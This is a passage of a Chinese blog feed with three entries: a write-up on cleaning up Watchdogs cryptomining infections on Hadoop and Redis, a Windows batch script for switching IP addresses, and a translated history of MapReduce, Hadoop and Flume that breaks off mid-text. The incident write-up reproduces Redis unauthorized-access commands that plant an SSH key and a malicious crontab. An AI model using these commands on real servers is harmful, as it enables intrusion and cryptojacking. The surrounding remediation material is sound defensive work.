class="line">save</span><br></pre></td></tr></table></figure><p>其中【sshkey】表示攻击者的密钥</p><p>2.攻击者对存在未授权访问的<code>Redis</code>服务器写入<code>crontab</code>文件，定时执行恶意操作</p><p>具体为执行以下<code>payload</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">set x "【evil command】"</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>3.以上两个阶段中仅对<code>Redis</code>完全没有验证即可访问的情况，第三个阶段则开始针对设置了密码验证，但密码较弱的<code>Redis</code>进行攻击，受害范围进一步扩大。</p><p>然而<code>Redis</code>并不是唯一一个受到黑客“青眼”的数据库。如下表所示，<code>SQL Server</code>, <code>Mysql</code>, <code>Mongodb</code>这些常用数据库的安全问题，也被多个挖矿僵尸网络所利用；利用方式集中在未授权访问、密码爆破和漏洞利用。</p><h3 id="处理办法"><a href="#处理办法" class="headerlink" title="处理办法"></a>处理办法</h3><p>1.首先停止<code>cron</code>服务，避免因其不断执行而导致恶意文件反复下载执行。</p><p>如果操作系统可以使用service命令，则执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service crond stop</span><br></pre></td></tr></table></figure><p>如果没有service命令，执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/cron stop</span><br></pre></td></tr></table></figure><p>2.随后使用<code>busybox</code>删除以下两个so文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo busybox rm -f /etc/ld.so.preload</span><br><span class="line">sudo busybox rm -f /usr/local/lib/libioset.so</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><p><code>busybox</code>是一个小巧的<code>unix</code>工具集，许多<code>Linux</code>系统装机时已集成。使用它进行删除是因为系统自带的<code>rm</code>命令需要进行动态<code>so</code>库调用，而<code>so</code>库被恶意<code>hook</code>了，无法进行正常删除；而<code>busybox</code>的<code>rm</code>是静态编译的，无需调用<code>so</code>文件，所以不受影响。</p><p>3.清理恶意进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo kill -9 `ps -ef|grep Watchdogs|grep -v grep |awk '&#123;print $2&#125;'`</span><br><span class="line">sudo kill -9 `ps -ef|grep ksoftirqds|grep -v grep |awk '&#123;print $2&#125;'`</span><br></pre></td></tr></table></figure><p>4.清理cron相关文件，重启服务，具体为检查以下文件并清除其中的恶意指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/crontabs/root</span><br><span class="line">/var/spool/cron/root</span><br><span class="line">/etc/cron.d/root</span><br></pre></td></tr></table></figure><p>之后执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service crond start</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/cron start</span><br></pre></td></tr></table></figure><p>如果执行了以上操作任然发现有挖矿程序在运行的话，基本可以判断为机器上任然有病毒程序没有删除干净，对症下药即可。</p><h3 id="来自阿里云的安全建议"><a href="#来自阿里云的安全建议" class="headerlink" title="来自阿里云的安全建议"></a>来自阿里云的安全建议</h3><p>数字加密货币的获取依赖计算资源的特质，催生了黑客进行大规模入侵的动机和土壤；类似Watchdogs蠕虫这样的数据库入侵事件，不是第一起，也不会是最后一起。阿里云作为“编写时即考虑安全性”的平台，提供良好的安全基础设施和丰富的安全产品，帮助用户抵御挖矿和入侵，同时提供以下安全建议：</p><ol><li>在入侵发生之前，加强数据库服务的密码，尽量不将数据库服务开放在互联网上，或根据实际情况进行访问控制（<code>ACL</code>）。这些措施能够帮助有效预防挖矿、勒索等攻击。平时还要注意备份资料，重视安全产品告警。</li><li><p>如果怀疑主机已被入侵挖矿，对于自身懂安全的用户，在攻击者手段较简单的情况下，可以通过自查<code>cpu</code>使用情况、运行进程、定时任务等方式，锁定入侵源头。</p></li><li><p>针对云上的环境，对于攻击者采用较多隐藏手段的攻击（如本次的<code>Watchdogs</code>蠕虫，使<code>ps</code>、<code>top</code>等系统命令失效），建议使用阿里云安全的下一代云防火墙产品，其阻断恶意外联、能够配置智能策略的功能，能够有效帮助防御入侵。哪怕攻击者在主机上的隐藏手段再高明，下载、挖矿、反弹shell这些操作，都需要进行恶意外联；云防火墙的拦截将彻底阻断攻击链。此外，用户还可以通过自定义策略，直接屏蔽<code>pastebin.com</code>、<code>thrysi.com</code>等广泛被挖矿蠕虫利用的网站，达到阻断入侵的目的。</p></li></ol><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v1iwxf04j22uk0n4tbu.jpg" alt></p><p>如图是云防火墙帮助用户拦截此次<code>Watchdogs</code>蠕虫下载的例子，图中共拦截23次对<code>pastebin.com</code>的请求；这些拦截导致主机未下载恶意脚本，从而就不会发起对<code>thrysi.com</code>的请求，故规则命中次数为0。</p><ol start="4"><li>对于有更高定制化要求的用户，可以考虑使用阿里云安全管家服务。购买服务后将有经验丰富的安全专家提供咨询服务，定制适合您的方案，帮助加固系统，预防入侵。入侵事件发生后，也可介入直接协助入侵后的清理、事件溯源等，适合有较高安全需求的用户，或未雇佣安全工程师，但希望保障系统安全的企业。</li></ol><h3 id="第一次事件分析"><a href="#第一次事件分析" class="headerlink" title="第一次事件分析"></a>第一次事件分析</h3><p>以上记录的是第二次的挖矿事件，两次挖矿事件有一些区别，第一次<code>hadoop</code>集群上遇到的挖矿事件，被利用的漏洞是yarn提交的漏洞，整个感染流程如下：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v1ogyzquj20mo09sab7.jpg" alt></p><p>第二次遇到的漏洞是<code>redis</code>上的漏洞，第二次的挖矿事件更为复杂，简单的Linux命令已经被病毒屏蔽，需要更为复杂的操作才能发现问题的根源。第一次挖矿事件和第二次挖矿事件有一点不同就是第一次的挖矿事件中，在删除<code>crontab</code>命令，删除挖矿脚本之后，仍然出现挖矿操作，通过分析、思考挖矿的逻辑，说明在<code>crontab</code>之前应该还有一层在控制进程，通过分析<code>status</code>之后，果然发现有好几个异常连接，分别是指向荷兰和美国，在<code>iptables</code>里面把这些<code>ip</code>屏蔽掉之后就解决了问题。</p><p>同时这边提供应急解决思路，如果急需使用集群的话，可以根据这些挖矿病毒的特点——<code>CPU</code>高占用，写一个定期删除<code>CPU</code>占用超过<code>95</code>进程的脚本，同样用<code>Crontab</code>定期执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/sh</span><br><span class="line"></span><br><span class="line">NAME=$1</span><br><span class="line">echo $NAME</span><br><span class="line"><span class="meta">#</span>ID=`ps -ef | grep "$NAME" | grep -v "$0" | grep -v "grep" | awk '&#123;print $2&#125;'`</span><br><span class="line">CPU=`ps -aux | grep kworker | sort -rn -k +3 | head -1 | awk &#123;'print $3'&#125; | awk -F. '&#123;print $1&#125;'`</span><br><span class="line">ID=`ps -aux | grep kworker  | sort -rn -k +3 | head -1 | awk &#123;'print $2'&#125;`</span><br><span class="line">echo $CPU</span><br><span class="line">echo $ID</span><br><span class="line">echo "---------------"</span><br><span class="line">sleep 1s</span><br><span class="line">if [ $CPU -ge 95 ]; then</span><br><span class="line">   echo "killed $ID"</span><br><span class="line">   kill -9 $ID</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>然后<code>crontab -e</code>执行定时任务每分钟执行该脚本</p><p><code>crontab -e</code></p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /etc/init.d/killprocess.sh</span><br></pre></td></tr></table></figure><p>### </p><p>币圈多少也涉及一点，之前<code>BTC</code>劫持软件劫持下来的<code>BTC</code>所在地址根本没动，确实这个钱没有办法提现，应该时刻都被监控着。所以这次接触的挖矿脚本涉及的都是带匿名属性的数字货币。区块链在17 18年刮起的一阵风暴不知道还有没有后续了。</p><p>最后附上阿里云2019年1月发布的云上挖矿分析报告（双击打开）。</p><p><a href="https://paper.seebug.org/806/" target="_blank" rel="noopener">阿里云上挖矿分析报告</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;京东云和公司集群分别遇到过一次挖矿脚本，经过分析，发现两次挖矿事件有所不同，在这篇文档记录下两次挖矿事件的异同、总结和反思。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Hadoop" scheme="http://yoursite.com/categories/Hadoop/"/>
    
      <category term="Security" scheme="http://yoursite.com/categories/Hadoop/Security/"/>
    
    
      <category term="病毒" scheme="http://yoursite.com/tags/%E7%97%85%E6%AF%92/"/>
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="脚本" scheme="http://yoursite.com/tags/%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>win环境下更换IP的批处理</title>
    <link href="http://yoursite.com/2020/03/09/%E6%89%B9%E5%A4%84%E7%90%86%E6%9B%B4%E6%94%B9IP/"/>
    <id>http://yoursite.com/2020/03/09/批处理更改IP/</id>
    <published>2020-03-09T10:03:38.910Z</published>
    <updated>2019-05-09T06:45:42.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>之前公司IP地址出了点问题，要两个IP来回切换，找了个脚本一运行就出现问题，这边记录一下<br>脚本里面的网络名称尽量用英文的，先去网络适配里面更改一下，因为我这边尝试用原来的“本地连接”名字会出现乱码的情况，可能和命令行的编码有关</p></blockquote><a id="more"></a> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">cls</span><br><span class="line">color 0A</span><br><span class="line"> </span><br><span class="line">@echo off</span><br><span class="line">echo.</span><br><span class="line">echo ===change IP?==</span><br><span class="line">echo.</span><br><span class="line">echo 1:auto</span><br><span class="line">echo.</span><br><span class="line">echo 2:zt</span><br><span class="line">echo.</span><br><span class="line">echo.</span><br><span class="line">set/p sel=changestyle</span><br><span class="line">if &quot;%sel%&quot;==&quot;1&quot; goto auto</span><br><span class="line">if &quot;%sel%&quot;==&quot;2&quot; goto zt</span><br><span class="line">echo you dont choose</span><br><span class="line">goto end</span><br><span class="line"> </span><br><span class="line">:auto</span><br><span class="line">netsh interface ip set address name=&quot;local connection&quot; source=dhcp</span><br><span class="line">netsh interface ip delete dns &quot;local connection&quot; all</span><br><span class="line">ipconfig /flushdns</span><br><span class="line">ipconfig /all</span><br><span class="line">goto end</span><br><span class="line"> </span><br><span class="line">:zt</span><br><span class="line">echo waiting...</span><br><span class="line">netsh interface ip set address name=&quot;local connection&quot; source=static addr=10.0.20.22 mask=255.255.248.0 gateway=10.0.16.1 gwmetric=1</span><br><span class="line">netsh interface ip set dns name=&quot;local connection&quot; source=static addr=222.96.134.133</span><br><span class="line">netsh interface ip add dns name=&quot;local connection&quot; addr=222.96.128.68 index=2 </span><br><span class="line">ipconfig /flushdns</span><br><span class="line">ipconfig /all</span><br><span class="line">echo finish</span><br><span class="line">goto end</span><br><span class="line"> </span><br><span class="line">:end</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>IP地址是我随便写的，修改IP，保存为.bat后，修改本地连接名称，管理员运行就可以执行</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;之前公司IP地址出了点问题，要两个IP来回切换，找了个脚本一运行就出现问题，这边记录一下&lt;br&gt;脚本里面的网络名称尽量用英文的，先去网络适配里面更改一下，因为我这边尝试用原来的“本地连接”名字会出现乱码的情况，可能和命令行的编码有关&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Win" scheme="http://yoursite.com/categories/Win/"/>
    
      <category term="IP Change" scheme="http://yoursite.com/categories/Win/IP-Change/"/>
    
    
      <category term="Win" scheme="http://yoursite.com/tags/Win/"/>
    
      <category term="Tips" scheme="http://yoursite.com/tags/Tips/"/>
    
  </entry>
  
  <entry>
    <title>大规模数据处理的演化历程</title>
    <link href="http://yoursite.com/2020/03/09/%E6%B5%81%E5%BC%8F%E8%AE%A1%E7%AE%97%E6%B5%AA%E6%BD%AE/"/>
    <id>http://yoursite.com/2020/03/09/流式计算浪潮/</id>
    <published>2020-03-09T10:03:38.420Z</published>
    <updated>2019-05-28T10:26:24.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>文章原作者是Google MapReduce小组的一员，翻译自《Streaming System》最后一章《The Evolution of Large-Scale Data Processing》，翻译者是 陈守元（花名：巴真），阿里巴巴高级产品专家。阿里巴巴实时计算团队产品负责人。</p></blockquote><p>我最近看了一些深度学习的文章，有一些感触，机器学习的使用范围确实很有限，大众以为现在的AI和现在实际上的AI其实根本不是一个东西，如果机器学习能在短时间内迅速发展起来，我个人觉得只有两种可能：第一种可能：要么横向在某个传统行业取得巨大进展，被其他行业纷纷效仿，但是很难，机器学习需要都整体数据有一个完全的把控，只有已经自动化相当完备的行业才有使用机器学习的基础，更何况还有行业壁垒，从中盈利的公司可能根本不会宣传，别的人也就无从得知了。</p><p>第二种可能：深度学习出现重大进展，深度学习作为黑盒使用是一件很离谱的事情，理论上来说要解析深度学习的原理需要很多别的学科来进行理论支持，短时间内出现重大进展其实可能也不大。</p><p>那么如果AI这阵风最终没有刮起来，那么还是要看流处理的了。</p><p>下面是原文：</p></blockquote><a id="more"></a> <h2 id="大规模数据处理的演化历程"><a href="#大规模数据处理的演化历程" class="headerlink" title="大规模数据处理的演化历程"></a>大规模数据处理的演化历程</h2><p>大数据如果从 Google 对外发布 MapReduce 论文算起，已经前后跨越十五年，我打算在本文和你蜻蜓点水般一起浏览下大数据的发展史，我们从最开始 MapReduce 计算模型开始，一路走马观花看看大数据这十五年关键发展变化，同时也顺便会讲解流式处理这个领域是如何发展到今天的这幅模样。这其中我也会加入一些我对一些业界知名大数据处理系统 (可能里面有些也不那么出名) 的观察和评论，同时考虑到我很有可能简化、低估甚至于忽略了很多重要的大数据处理系统，我也会附带一些参考材料帮助大家学习更多更详细的知识。</p><p>另外，我们仅仅讨论了大数据处理中偏 MapReduce/Hadoop 系统及其派系分支的大数据处理。我没有讨论任何 SQL 引擎 [1]，我们同样也没有讨论 HPC 或者超级计算机。尽管我这章的标题听上去领域覆盖非常广泛，但实际上我仅仅会讨论一个相对比较垂直的大数据领域。</p><p>同样需要提醒的一件事情是，我在本文里面或多或少会提到一些 Google 的技术，不用说这块是因为与我在谷歌工作了十多年的经历有关。 但还有另外两个原因：1）大数据对谷歌来说一直很重要，因此在那里创造了许多有价值的东西值得详细讨论，2）我的经验一直是 谷歌以外的人似乎更喜欢学习 Google 所做的事情，因为 Google 公司在这方面一直有点守口如瓶。 所以，当我过分关注我们一直在”闭门造车”的东西时，姑且容忍下我吧。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h75jzktjj20u00e80sx.jpg" alt></p><p>为了使我们这一次大数据旅行显得更加具体有条理，我们设计了图 10-1 的时间表，这张时间表概括地展示了不同系统的诞生日期。</p><p>在每一个系统介绍过程中，我会尽可能说明清楚该系统的简要历史，并且我会尝试从流式处理系统的演化角度来阐释该系统对演化过程的贡献。最后，我们将回顾以上系统所有的贡献，从而全面了解上述系统如何演化并构建出现代流式处理系统的。</p><h3 id="MapReduce"><a href="#MapReduce" class="headerlink" title="MapReduce"></a>MapReduce</h3><p>我们从 MapReduce 开始我们的旅程。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h76cbmb5j20u00e4glt.jpg" alt></p><p>我认为我们可以很确定地说，今天我们讨论的大规模数据处理系统都源自于 2003 年 MapReduce。当时，谷歌的工程师正在构建各种定制化系统，以解决互联网时代下大数据处理难题。当他们这样尝试去解决这些问题时候，发现有三个难以逾越的坎儿：</p><ul><li>数据处理很难 只要是数据科学家或者工程师都很清楚。如果你能够精通于从原始数据挖掘出对企业有价值的信息，那这个技能能够保你这辈子吃喝不愁。</li><li>可伸缩性很难 本来数据处理已经够难了，要从大规模数据集中挖掘出有价值的数据更加困难。</li><li>容错很难 要从大规模数据集挖掘数据已经很难了，如果还要想办法在一批廉价机器构建的分布式集群上可容错地、准确地方式挖掘数据价值，那真是难于上青天了。</li></ul><p>在多种应用场景中都尝试解决了上述三个问题之后，Google 的工程师们开始注意到各自构建的定制化系统之间颇有相似之处。最终，Google 工程师悟出来一个道理: 如果他们能够构建一个可以解决上述问题二和问题三的框架，那么工程师就将可以完全放下问题二和三，从而集中精力解决每个业务都需要解决的问题一。于是，MapReduce 框架诞生了。</p><p>MapReduce 的基本思想是提供一套非常简洁的数据处理 API，这套 API 来自于函数式编程领域的两个非常易于理解的操作：map 和 reduce（图 10-3）。使用该 API 构建的底层数据流将在这套分布式系统框架上执行，框架负责处理所有繁琐的可扩展性和容错性问题。可扩展性和容错性问题对于分布式底层工程师来说无疑是非常有挑战的课题，但对于我们普通工程师而言，无益于是灾难。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h76jh1w8j20u00e20t6.jpg" alt></p><p>我们已经在第 6 章详细讨论了 MapReduce 的语义，所以我们在此不再赘述。仅仅简单地回想一下，我们将处理过程分解为六个离散阶段（MapRead，Map，MapWrite，ReduceRead，Reduce，ReduceWrite）作为对于流或者表进行分析的几个步骤。我们可以看到，整体上 Map 和 Reduce 阶段之间差异其实也不大 ; 更高层次来看，他们都做了以下事情：</p><ul><li>从表中读取数据，并转换为数据流 (译者注: 即 MapRead、ReduceRead)</li><li>针对上述数据流，将用户编写业务处理代码应用于上述数据流，转换并形成新的一个数据流。 (译者注: 即 Map、Reduce)</li><li>将上述转换后的流根据某些规则分组，并写出到表中。 (译者注: 即 MapWrite、ReduceWrite)</li></ul><p>随后，Google 内部将 MapReduce 投入生产使用并得到了非常广泛的业务应用，Google 认为应该和公司外的同行分享我们的研究成果，最终我们将 MapReduce 论文发表于 OSDI 2004（见图 10-4）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h76rug8xj20u00lrwhb.jpg" alt></p><p>论文中，Google 详细描述了 MapReduce 项目的历史，API 的设计和实现，以及有关使用了 MapReduce 框架的许多不同生产案例的详细信息。当然，Google 没有提供任何实际的源代码，以至于最终 Google 以外的人都认为：“是的，这套系统确实牛啊！”，然后立马回头去模仿 MapReduce 去构建他们的定制化系统。</p><p>在随后这十年的过程中，MapReduce 继续在谷歌内部进行大量开发，投入大量时间将这套系统规模推进到前所未有的水平。如果读者朋友希望了解一些更加深入更加详细的 MapReduce 说明，我推荐由我们的 MapReduce 团队中负责扩展性、性能优化的大牛 Marián Dvorský撰写的文章《History of massive-scale sorting experiments at Google》（图 10-5）</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h76yqegmj20os0oj75n.jpg" alt></p><p>我这里希望强调的是，这么多年来看，其他任何的分布式架构最终都没有达到 MapReduce 的集群规模，甚至在 Google 内部也没有。从 MapReduce 诞生起到现在已经跨越十载之久，都未能看到真正能够超越 MapReduce 系统规模的另外一套系统，足见 MapReduce 系统之成功。14 年的光阴看似不长，对于互联网行业已然永久。</p><p>从流式处理系统来看，我想为读者朋友强调的是 MapReduce 的简单性和可扩展性。 MapReduce 给我们的启发是：MapReduce 系统的设计非常勇于创新，它提供一套简便且直接的 API，用于构建业务复杂但可靠健壮的底层分布式数据 Pipeline，并足够将这套分布式数据 Pipeline 运行在廉价普通的商用服务器集群之上。</p><h3 id="hadoop"><a href="#hadoop" class="headerlink" title="hadoop"></a>hadoop</h3><p>我们大数据旅程的下一站是 Hadoop（图 10-6）。需要着重说明的是：我为了保证我们讨论的重心不至于偏离太多，而压缩简化讨论 Hadoop 的内容。但必须承认的是，Hadoop 对我们的行业甚至整个世界的影响不容小觑，它带来的影响远远超出了我在此书讨论的范围。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h77gg7y9j20u00dwdg1.jpg" alt></p><p>Hadoop 于 2005 年问世，当时 Doug Cutting 和 Mike Cafarella 认为 MapReduce 论文中的想法太棒了，他们在构建 Nutch webcrawler 的分布式版本正好需要这套分布式理论基础。在这之前，他们已经实现了自己版本的 Google 分布式文件系统（最初称为 Nutch 分布式文件系统的 NDFS，后来改名为 HDFS 或 Hadoop 分布式文件系统）。因此下一步，自然而然的，基于 HDFS 之上添加 MapReduce 计算层。他们称 MapReduce 这一层为 Hadoop。</p><p>Hadoop 和 MapReduce 之间的主要区别在于 Cutting 和 Cafarella 通过开源（以及 HDFS 的源代码）确保 Hadoop 的源代码与世界各地可以共享，最终成为 Apache Hadoop 项目的一部分。雅虎聘请 Cutting 来帮助将雅虎网络爬虫项目升级为全部基于 Hadoop 架构，这个项目使得 Hadoop 有效提升了生产可用性以及工程效率。自那以后，整个开源生态的大数据处理工具生态系统得到了蓬勃发展。与 MapReduce 一样，相信其他人已经能够比我更好地讲述了 Hadoop 的历史。我推荐一个特别好的讲解是 Marko Bonaci 的《The history of Hadoop》，它本身也是一本已经出版的纸质书籍（图 10-7）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h77mn4tmj20u00n8jsn.jpg" alt></p><p>在 Hadoop 这部分，我期望读者朋友能够了解到围绕 Hadoop 的开源生态系统对整个行业产生的巨大影响。通过创建一个开放的社区，工程师可以从早期的 GFS 和 MapReduce 论文中改进和扩展这些想法，这直接促进生态系统的蓬勃发展，并基于此之上产生了许多有用的工具，如 Pig，Hive，HBase，Crunch 等等。这种开放性是导致我们整个行业现有思想多样性的关键，同时 Hadoop 开放性生态亦是直接促进流计算系统发展。</p><h3 id="flume"><a href="#flume" class="headerlink" title="flume"></a>flume</h3><p>我们现在再回到 Google，讨论 Google 公司中 MapReduce 的官方继承者：Flume（[图 10-8]，有时也称为 FlumeJava，这个名字起源于最初 Flume 的 Java 版本。需要注意的是，这里的 Flume 不要与 Apache Flume 混淆，这部分是面向不同领域的东西，只是恰好有同样的名字）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h77zrwe0j20u00dwjrl.jpg" alt></p><p>Flume 项目由 Craig Chambers 在 2007 年谷歌西雅图办事处成立时发起。Flume 最初打算是希望解决 MapReduce 的一些固有缺点，这些缺点即使在 MapReduce 最初大红大紫的阶段已经非常明显。其中许多缺点都与 MapReduce 完全限定的 Map→Shuffle→Reduce 编程模型相关 ; 这个编程模型虽然简单，但它带来了一些缺点：</p><ul><li>由于单个 MapReduce 作业并不能完成大量实际上的业务案例，因此许多定制的编排系统开始在 Google 公司内部出现，这些编排系统主要用于协调 MapReduce 作业的顺序。这些系统基本上都在解决同一类问题，即将多个 MapReduce 作业粘合在一起，创建一个解决复杂问题的数据管道。然而，这些编排系统都是 Google 各自团队独立开发的，相互之间也完全不兼容，是一类典型的重复造轮子案例。</li><li>更糟糕的是，由于 MapReduce 设计的 API 遵循严格结构，在很多情况下严格遵循 MapReduce 编程模型会导致作业运行效率低下。例如，一个团队可能会编写一个简单地过滤掉一些元素的 MapReduce，即，仅有 Map 阶段没有 Reduce 阶段的作业。这个作业下游紧接着另一个团队同样仅有 Map 阶段的作业，进行一些字段扩展和丰富 (仍然带一个空的 Reduce 阶段作业）。第二个作业的输出最终可能会被第三个团队的 MapReduce 作业作为输入，第三个作业将对数据执行某些分组聚合。这个 Pipeline，实际上由一个合并 Map 阶段 (译者注: 前面两个 Map 合并为一个 Map)，外加一个 Reduce 阶段即可完成业务逻辑，但实际上却需要编排三个完全独立的作业，每个作业通过 Shuffle 和 Output 两个步骤链接在一起。假设你希望保持代码的逻辑性和清洁性，于是你考虑将部分代码进行合并，但这个最终导致第三个问题。</li><li>为了优化 MapReduce 作业中的这些低效代码，工程师们开始引入手动优化，但不幸的是，这些优化会混淆 Pipeline 的简单逻辑，进而增加维护和调试成本。</li></ul><p>Flume 通过提供可组合的高级 API 来描述数据处理流水线，从而解决了这些问题。这套设计理念同样也是 Beam 主要的抽象模型，即 PCollection 和 PTransform 概念，如图 10-9 所示。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h785ps5gj20u00e50st.jpg" alt></p><p>这些数据处理 Pipeline 在作业启动时将通过优化器生成，优化器将以最佳效率生成 MapReduce 作业，然后交由框架编排执行。整个编译执行原理图可以在图 10-10 中看到。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h78bx6woj20u00fb0sv.jpg" alt></p><p>也许 Flume 在自动优化方面最重要的案例就是是合并（Reuven 在第 5 章中讨论了这个主题），其中两个逻辑上独立的阶段可以在同一个作业中顺序地（消费者 - 生产者融合）执行或者并行执行（兄弟融合），如图 10-11 所示。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h78hq0dzj20u00gwglp.jpg" alt></p><p>将两个阶段融合在一起消除了序列化 / 反序列化和网络开销，这在处理大量数据的底层 Pipeline 中非常重要。</p><p>另一种类型的自动优化是 combiner lifting（见图 10-12），当我们讨论增量合并时，我们已经在第 7 章中讨论了这些机制。combiner lifting 只是我们在该章讨论的多级组合逻辑的编译器自动优化：以求和操作为例，求和的合并逻辑本来应该运算在分组 (译者注: 即 Group-By) 操作后，由于优化的原因，被提前到在 group-by-key 之前做局部求和（根据 group-by-key 的语义，经过 group-by-key 操作需要跨网络进行大量数据 Shuffle）。在出现数据热点情况下，将这个操作提前可以大大减少通过网络 Shuffle 的数据量，并且还可以在多台机器上分散掉最终聚合的机器负载。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h78n948fj20u00dxmx9.jpg" alt></p><p>由于其更清晰的 API 定义和自动优化机制，在 2009 年初 Google 内部推出后 FlumeJava 立即受到巨大欢迎。之后，该团队发表了题为《Flume Java: Easy, Efficient Data-Parallel Pipelines》（<a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/35650.pdf）" target="_blank" rel="noopener">https://storage.googleapis.com/pub-tools-public-publication-data/pdf/35650.pdf）</a> 的论文（参见图 10-13），这篇论文本身就是一个很好的学习 FlumeJava 的资料。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h78xgh4qj20u00mewi2.jpg" alt></p><p>Flume C++ 版本很快于 2011 年发布。之后 2012 年初，Flume 被引入为 Google 的所有新工程师提供的 Noogler6 培训内容。MapReduce 框架于是最终被走向被替换的命运。</p><p>从那时起，Flume 已经迁移到不再使用 MapReduce 作为执行引擎 ; 相反，Flume 底层基于一个名为 Dax 的内置自定义执行引擎。 工作本身。不仅让 Flume 更加灵活选择执行计划而不必拘泥于 Map→Shuffle→Reduce MapReduce 的模型，Dax 还启用了新的优化，例如 Eugene Kirpi-chov 和 Malo Denielou 的《No shard left behind》博客文章（<a href="https://cloud.google.com/blog/products/gcp/no-shard-left-behind-dynamic-work-rebalancing-in-google-cloud-dataflow）" target="_blank" rel="noopener">https://cloud.google.com/blog/products/gcp/no-shard-left-behind-dynamic-work-rebalancing-in-google-cloud-dataflow）</a> 中描述的动态负载均衡（图 10-14）。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g3h796bl2pj20u00kwabc.jpg" alt></p><p>尽管那篇博客主要是基于 Google DataFlow 框架下讨论问题，但动态负载均衡（或液态分片，Google 内部更习惯这样叫）可以让部分已经完成工作的 Worker 能够从另外一些繁忙的 Worker 手中分配一些额外的工作。在 Job 运行过程中，通过不断的动态调整负载分配可以将系统运行效率趋近最优，这种算法将比传统方法下有经验工程师手工设置的初始参数性能更好。Flume 甚至为 Worker 池变化进行了适配，一个拖慢整个作业进度的 Worker 会将其任务转移到其他更加高效的 Worker 上面进行执行。Flume 的这些优化手段，在 Google 内部为公司节省了大量资源。</p><p>最后一点，Flume 后来也被扩展为支持流语义。除 Dax 作为一个批处理系统引擎外，Flume 还扩展为能够在 MillWheel 流处理系统上执行作业（稍后讨论）。在 Google 内部，之前本书中讨论过的大多数高级流处理语义概念首先被整合到 Flume 中，然后才进入 Cloud Dataflow 并最终进入 Apache Beam。</p><p>总而言之，本节我们主要强调的是 Flume 